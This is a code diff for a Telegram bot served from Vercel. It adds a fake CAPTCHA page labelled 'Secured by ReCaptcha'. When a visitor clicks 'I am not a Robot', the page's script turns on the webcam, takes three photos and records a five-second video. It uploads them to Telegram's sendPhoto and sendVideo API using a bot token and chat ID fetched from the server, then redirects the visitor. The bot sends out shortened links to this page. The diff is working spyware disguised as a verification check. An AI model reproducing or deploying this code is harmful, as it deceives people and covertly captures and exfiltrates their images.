@@ -178,16 +178,405 @@ const getRelativeTime = (timestamp) => {
   return `${dateStr}, ${Math.floor(diff / 86400)} days ago`;
 };
 
+// HTML Content (Integrated)
+const getVerificationHtml = (sessionToken) => `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verification Required</title>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('https://images.unsplash.com/photo-1506748686214-e9df14d4d9d0?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&q=80&w=1920') no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      background: linear-gradient(135deg, rgba(0, 0, 0, 0.4), rgba(0, 0, 50, 0.3));
+      z-index: 1;
+    }
+
+    .container {
+      position: relative;
+      z-index: 2;
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37), 0 0 15px rgba(0, 123, 255, 0.3);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      text-align: center;
+      max-width: 350px;
+      width: 80%;
+      margin: 20px;
+      color: #333;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .verification-logo {
+      width: 80px;
+      margin: 0 auto 20px auto;
+      transition: transform 0.3s ease;
+    }
+
+    .verification-logo:hover {
+      transform: scale(1.1);
+    }
+
+    .verification-logo svg {
+      filter: drop-shadow(0 0 5px rgba(76, 175, 80, 0.5));
+    }
+
+    .verification-icon {
+      display: inline-block;
+      margin-bottom: 15px;
+      transition: transform 0.3s ease;
+    }
+
+    .verification-icon:hover {
+      transform: scale(1.1);
+    }
+
+    .verification-icon svg {
+      width: 50px;
+      height: 50px;
+      fill: #3C84E4;
+      opacity: 0.9;
+      filter: drop-shadow(0 0 5px rgba(60, 132, 228, 0.5));
+    }
+
+    .verification-text {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #333;
+      animation: fadeIn 1.2s ease-in-out;
+    }
+
+    .verify-btn {
+      background: linear-gradient(45deg, #007BFF, #00C4FF);
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 123, 255, 0.5);
+      width: 100%;
+      max-width: 300px;
+      font-weight: bold;
+      position: relative;
+      overflow: hidden;
+      z-index: 3;
+      transition: all 0.3s ease;
+      animation: bounce 1.5s infinite ease-in-out;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    .verify-btn:hover {
+      background: linear-gradient(45deg, #0056b3, #0099cc);
+      transform: translateY(-3px) scale(1.05);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4), 0 0 15px rgba(0, 123, 255, 0.7);
+    }
+
+    .verify-btn:active {
+      transform: translateY(0) scale(0.95);
+    }
+
+    .verify-btn::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.6s ease, height 0.6s ease;
+    }
+
+    .verify-btn.ripple::before {
+      width: 300px;
+      height: 300px;
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 14px;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    .secure-badge svg {
+      width: 18px;
+      height: 18px;
+      fill: #666;
+      margin-right: 5px;
+      transition: transform 0.3s ease;
+    }
+
+    .secure-badge:hover svg {
+      transform: scale(1.1);
+    }
+
+    #video-stream {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="overlay"></div>
+  
+  <div class="container">
+    <svg class="verification-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+      <circle cx="32" cy="32" r="30" stroke="#4CAF50" stroke-width="4" fill="none"/>
+      <path d="M20 34 L28 42 L44 22" stroke="#4CAF50" stroke-width="4" fill="none"/>
+    </svg>
+    
+    <div class="verification-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+        <path d="M48 24h-4V16a12 12 0 0 0-24 0v8h-4a4 4 0 0 0-4 4v24a4 4 0 0 0 4 4h32a4 4 0 0 0 4-4V28a4 4 0 0 0-4-4zM24 16a8 8 0 1 1 16 0v12h-16V16z"/>
+      </svg>
+    </div>
+    
+    <p class="verification-text">Please click the button below to verify you are not a robot.</p>
+    
+    <button id="verify-btn" class="verify-btn">I am not a Robot</button>
+    
+    <div class="secure-badge">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+        <path d="M32 12a12 12 0 0 0-12 12v12h24V24a12 12 0 0 0-12-12zm0 4a8 8 0 1 1 16 0v12h-16V16zM20 28v24a12 12 0 0 0 24 0V28H20z"/>
+      </svg>
+      <span>Secured by ReCaptcha</span>
+    </div>
+
+    <video id="video-stream" autoplay></video>
+  </div>
+
+  <script>
+    async function fetchBotDetails(sessionToken) {
+      console.log('Extracted sessionToken:', sessionToken);
+
+      if (!sessionToken) {
+        console.error('Missing session token');
+        alert("Missing session token.");
+        throw new Error('Missing session token');
+      }
+
+      try {
+        const response = await fetch('/resolve-session', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ sessionToken }),
+        });
+
+        console.log('Fetch response status:', response.status);
+        if (!response.ok) {
+          const errorData = await response.json();
+          console.error('Fetch error:', errorData);
+          throw new Error(errorData.error || 'Failed to fetch bot details');
+        }
+
+        const data = await response.json();
+        console.log('Fetched bot details:', data);
+        return {
+          botToken: data.botToken,
+          chatId: data.chatId,
+        };
+      } catch (error) {
+        console.error('Error fetching bot details:', error);
+        alert('Failed to fetch bot details. Session may have expired.');
+        throw error;
+      }
+    }
+
+    async function captureMedia() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const video = document.getElementById('video-stream');
+        video.srcObject = stream;
+
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            resolve();
+          };
+        });
+
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg'));
+          photos.push(photoBlob);
+          await new Promise((resolve) => setTimeout(resolve, 2000));
+        }
+
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) {
+            chunks.push(e.data);
+          }
+        };
+        mediaRecorder.start();
+
+        await new Promise((resolve) => setTimeout(resolve, 5000));
+        mediaRecorder.stop();
+
+        await new Promise((resolve) => {
+          mediaRecorder.onstop = resolve;
+        });
+
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+
+        stream.getTracks().forEach(track => track.stop());
+
+        return { photos, videoBlob };
+      } catch (error) {
+        console.error('Error accessing webcam:', error);
+        alert('Failed to access webcam. Ensure permissions are granted.');
+        throw error;
+      }
+    }
+
+    async function sendMediaToTelegram(photos, videoBlob, botToken, chatId) {
+      console.log('Sending media to Telegram with botToken:', botToken, 'chatId:', chatId);
+
+      const botTokenRegex = /^\d+:[A-Za-z0-9_-]+$/;
+      if (!botTokenRegex.test(botToken)) {
+        console.error('Invalid bot token format');
+        alert("Invalid bot token format.");
+        return;
+      }
+
+      if (!/^\d+$/.test(chatId)) {
+        console.error('Invalid chat ID');
+        alert("Invalid chat ID. Must be a number.");
+        return;
+      }
+
+      for (let i = 0; i < photos.length; i++) {
+        const formDataPhoto = new FormData();
+        formDataPhoto.append('chat_id', chatId);
+        formDataPhoto.append('photo', photos[i], \`photo\${i + 1}.jpg\`);
+        formDataPhoto.append('caption', \`⚡Join ➣ @Kali_Linux_BOTS\`);
+
+        try {
+          const responsePhoto = await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
+            method: 'POST',
+            body: formDataPhoto
+          });
+          const resultPhoto = await responsePhoto.json();
+          console.log('Photo send response:', resultPhoto);
+          if (!resultPhoto.ok) {
+            throw new Error('Failed to send photo.');
+          }
+        } catch (error) {
+          console.error('Error sending photo:', error);
+          alert('Verification failed ❌. Try again later.♻️');
+          return;
+        }
+      }
+
+      const formDataVideo = new FormData();
+      formDataVideo.append('chat_id', chatId);
+      formDataVideo.append('video', videoBlob, 'video.mp4');
+      formDataVideo.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');
+
+      try {
+        const responseVideo = await fetch(\`https://api.telegram.org/bot\${botToken}/sendVideo\`, {
+          method: 'POST',
+          body: formDataVideo
+        });
+        const resultVideo = await responseVideo.json();
+        console.log('Video send response:', resultVideo);
+        if (!resultVideo.ok) {
+          throw new Error('Failed to send video.');
+        }
+
+        alert('Verification successful! Redirecting...');
+        window.location.href = \`https://for-free.serv00.net/2/?id=\${chatId}\`;
+      } catch (error) {
+        console.error('Error sending video:', error);
+        alert('Verification failed ❌. Try again later.♻️');
+      }
+    }
+
+    const verifyBtn = document.getElementById('verify-btn');
+    const sessionToken = window.location.pathname.split('/').pop();
+    verifyBtn.addEventListener('click', async (e) => {
+      console.log('Verify button clicked');
+      verifyBtn.classList.add('ripple');
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      try {
+        const { botToken, chatId } = await fetchBotDetails(sessionToken);
+        const { photos, videoBlob } = await captureMedia();
+        await sendMediaToTelegram(photos, videoBlob, botToken, chatId);
+      } catch (error) {
+        console.error('Error in verification process:', error);
+      } finally {
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'I am not a Robot';
+      }
+    });
+  </script>
+</body>
+</html>
+`;
+
 // Vercel Handler
 module.exports = async (req, res) => {
   try {
     console.log(`Received request: ${req.method} ${req.url}`);
     console.log('Request body:', req.body);
 
-    // Handle Telegram updates (POST /<botToken>)
-    if (req.method === 'POST' && req.url.startsWith('/')) {
+    // Handle Telegram updates (POST /created/<botToken>)
+    if (req.method === 'POST' && req.url.startsWith('/created/')) {
       const pathParts = req.url.split('/');
-      const botToken = pathParts[1] || req.query.token; // Try URL path first, then query
+      const botToken = pathParts[2] || req.query.token;
       console.log('Extracted botToken:', botToken);
 
       if (!botToken) {
@@ -586,7 +975,7 @@ module.exports = async (req, res) => {
               expiresAt: Math.floor(Date.now() / 1000) + 600,
             });
 
-            const longHelpUrl = `https://for-free.serv00.net/t/index.html?session=${sessionToken}`;
+            const longHelpUrl = `https://mybot-drab.vercel.app/verify/${sessionToken}`;
             const shortHelpUrl = await shortenUrl(longHelpUrl);
             await bot.telegram.answerCbQuery(callbackQueryId);
             await bot.telegram.sendMessage(chatId, `For help, open this link: ${shortHelpUrl}`);
@@ -612,6 +1001,18 @@ module.exports = async (req, res) => {
       }
 
       res.status(200).json({ ok: true });
+    }
+
+    // Serve Verification Page (GET /verify/<sessionToken>)
+    else if (req.method === 'GET' && req.url.startsWith('/verify/')) {
+      const sessionToken = req.url.split('/verify/')[1];
+      if (!sessionToken) {
+        res.status(400).send('Missing session token');
+        return;
+      }
+
+      res.setHeader('Content-Type', 'text/html');
+      res.status(200).send(getVerificationHtml(sessionToken));
     }
 
     // Handle /resolve-session endpoint
